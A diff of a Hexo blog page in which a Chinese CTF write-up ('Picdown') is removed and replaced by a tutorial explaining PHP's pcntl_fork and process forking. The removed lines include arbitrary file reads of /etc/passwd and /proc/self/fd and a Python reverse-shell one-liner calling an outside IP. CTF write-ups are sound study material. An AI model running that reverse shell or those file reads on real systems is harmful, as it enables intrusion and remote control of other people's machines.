@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Picdown, Hexo">
+    <meta name="keywords" content="pcntl_fork, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Picdown | Hexo</title>
+    <title>pcntl_fork | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Picdown</h1>
+                    <h1 class="description center-align post-title">pcntl_fork</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-24
+                    2021-05-04
                 </div>
                 
 
@@ -465,27 +465,33 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">$pid &#x3D; pcntl_fork();</span><br><span class="line">if ($pid &#x3D;&#x3D; -1)</span><br><span class="line">&#123;</span><br><span class="line">   	die(&quot;could not fork&quot;);</span><br><span class="line">&#125;</span><br><span class="line">elseif($pid &#x3D;&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">   	echo &quot;I&#39;m the child  process \n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">   	echo &quot;I&#39;m the parent process \n&quot;;</span><br><span class="line">   	exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2>非预期解</h2>
-
-<p>打开题目是一个输入框，随便输，发现url变了</p>
-<p><a target="_blank" rel="noopener" href="http://7ca0ad1e-09a8-4c80-b6ad-5f9afa360fb7.node3.buuoj.cn/page%60%60%60?url=1%60%60%60">http://7ca0ad1e-09a8-4c80-b6ad-5f9afa360fb7.node3.buuoj.cn/page```?url=1```</a></p>
-<p>然后尝试改变url，尝试读取/etc/passwd,是可以成功读取得，然后我们就尝试读取flag</p>
+<p>要搞清楚fork的执行过程，就必须弄清楚操作系统中“进程process”概念</p>
+<p>一个进程，主要包括三个元素：</p>
+<p>1.一个可以执行的程序</p>
+<p>2.和该进程相关联的全部数据（包括变量，内存空间，缓冲区等等）</p>
+<p>3.程序得执行上下文</p>
+<p>不妨简单得理解为一个进程表示的就是一个可执行程序得一次执行过程的一个状态，操作系统对进程得管理，典型的情况就是通过进程表完成的。进程表得每一个表项，记录的是当前操作系统中一个进程得情况。</p>
+<p>“程序计数器”得寄存器，指出当前占用cpu进程要执行得下一条指令的位置</p>
+<p>当分给某个进程得cpu时间已经用完了，操作系统将该进程相关得寄存器得值，保存在该进程在进程表对印的表项里，把要接替这个进程cpu得那个进程从进程表里读出，并更新到相应的寄存器。主要要记住程序寄存器pc指出程序当前已经执行到哪里，是进程上 下文的重要内容，换出 CPU的进程要保存这个寄存器的值，换入CPU的进程，也要根据进程表中保存的本进程执行上下文信息，更新这个寄存器）。</p>
 <blockquote>
-<p>url=/flag,就可以读取flag</p>
+<p>pid=pcntl_fork();</p>
 </blockquote>
-<h2>预期解</h2>
-
-<p>一直没有成功也是无语了</p>
-<p>我们通过查看proc/self/cmdline去查看他的进程，去读取app.py</p>
-<p>![](1.    PNG)</p>
-<p>我们可以看到他其实是吧那个文件给删除了，但是我们知道如果一个文件在打开的情况下被删除是可以在proc/self/fd/中找回的</p>
-<p>于是进行爆破，可以看到是/proc/self/fd/3，但是就在这里我得到的key一直提示说是错误的，也是没谁了</p>
-<p>然后反弹shell</p>
-<blockquote>
-<p>shell=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“47.xx.xx.xxx”,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/bash”,”-i”]);’</p>
-</blockquote>
-<p>172.16.158.38</p>
+<p>操作系统创建一个新的进程（子进程），并且在进程表中相应为它建立一个新的表项。新进程和原有进程的可执行程序是同一个程序；上下文和数据，绝大部分就是原进程（父进程）的拷贝，但它们是两个相互独立的进程！此时程序寄存器pc在父、子进程的上下文中都声称，这个进程目前执行到fork调用即将返回（此时子进程不占有CPU，子进程的pc不是真正保存在寄存器中，而是作为进程上下文保存在进程表中的对应表项内）。问题是怎么返回，在父子进程中就分道扬镳。</p>
+<p>父进程继续执行操作系统对fork的实现，使这个调用在父进程中返回刚刚创建的子进程的pid（一个正整数），所以后面的if语句中pid&lt;0, pid==0的两个分支都不会执行。所以输出：i am the parent process…</p>
+<p>接着子进程在之后的某个时候得到调度，它的上下文被换入，占据 CPU，操作系统对fork的实现使得子进程中fork调用返回0，所以在这个进程中pid=0（注意这不是父进程了哦，虽然是同一个程序，但是这是同一个程序的另外一次执行，在操作系统中这次执行是由另外一个进程表示的，从执行的角度说和父进程相互独立）。这个进程在继续执行的过程中，if语句中 pid&lt;0不满足，但是pid==0是true，所以输出：i am the child process…</p>
+<p>为什么看上去程序中互斥的两个分支都被执行了，在一个程序的一次执行中，这当然是不可能的，事实上你看到的两行输出是来自两个独立的进程，而这两个进程来自同一个程序的两次执行。</p>
+<p>fork之后，操作系统会复制一个与父进程完全相同的子进程，虽说是父子关系，但是在操作系统看来，他们更像兄弟关系，这2个进程共享代码空间，但是数据空间是互相独立的，子进程数据空间中的内容是父进程的完整拷贝，指令指针也完全相同，但只有一点不同，如果fork成功，子进程中fork的返回值是0，父进程中fork的返回值是子进程的进程号，如果fork失败，父进程会返回错误。</p>
+<p>可以这样想象，2个进程一直同时运行，而且步调一致，在fork之后，他们分别作不同的工作，也就是分岔了，这也是fork为什么叫fork的原因。<br>至于哪一个进程最先运行，这与操作系统平台的调度算法有关，而且这个问题在实际应用中并不重要，如果需要父子进程协同运作，可以通过控制语法结构的办法解决。</p>
+<p>fork前子进程可以继承父进程的东西，但是在pcntl_fork()后子进程和父进程就没有任何继承关系了。在子进程里创建的东西是子进程的，在父进程创建的东西是父进程的，可以完全看成是两个独立的进程。</p>
+<p>在程序段里用了pcntl_fork()之后程序出了分岔，派生出了两个进程，具体哪个先运行就看该系统的调度算法了。<br>在这里，我们可以这么认为，在运行到”pid=pcntl_fork();”时系统派生出一个跟主程序一模一样的子进程。该进程的”pid=pcntl_fork();”一句中 pid得到的就是子进程本身的pid；子进程结束后，父进程的”pid=pcntl_fork();”中pid得到的就是父进程本身的pid，因此该程序有两行输出。</p>
+<p>pcntl_fork()函数复制了当前进程的PCB，并向父进程返回了派生子进程的pid，父子进程并行，打印语句的先后完全看系统的调度算法，打印的内容控制则靠pid变量来控制。因为我们知道pcntl_fork()向父进程返回了派生子进程的pid，是个正整数；而派生子进程的pid变量并没有被改变，这一区别使得我们看到了他们的不同输出。</p>
+<ol>
+<li>派生子进程的进程，即父进程，其pid不变；</li>
+<li>对子进程来说，fork()函数返回给它0, 但它自身的pid绝对不会是0；之所以fork()函数返回0给它，是因为它随时可以调用getpid()来获取自己的pid；</li>
+<li>fork之后父、子进程除非采用了同步手段，否则不能确定谁先运行，也不能确定谁先结束。认为子进程结束后父进程才从fork返回的，这是不对的，fork不是这样的，vfork才这样。</li>
+</ol>
 
                 
             </div>
@@ -512,7 +518,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://ckylsy.github.io/2021/04/24/Picdown/">http://ckylsy.github.io/2021/04/24/Picdown/</a>
+                    <a href="http://ckylsy.github.io/2021/05/04/pcntl-fork/">http://ckylsy.github.io/2021/05/04/pcntl-fork/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -719,54 +725,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/04/24/Linux%E7%9A%84-proc-self%E5%AD%A6%E4%B9%A0/">
+                <a href="/2021/05/04/pcntl-fork/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Linux的/proc/self学习">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="pcntl_fork">
                         
-                        <span class="card-title">Linux的/proc/self学习</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-24
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Chen Keyan
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/04/24/%E6%9C%B1%E9%9B%80%E6%9D%AFphpweb/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="朱雀杯phpweb">
-                        
-                        <span class="card-title">朱雀杯phpweb</span>
+                        <span class="card-title">pcntl_fork</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -777,7 +747,45 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Chen Keyan
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/05/04/%E5%8D%81%E4%B8%89%E5%B1%8Aeasyphp/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="PHP、">
+                        
+                        <span class="card-title">PHP、</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-04
                             </span>
                         <span class="publish-author">
                             
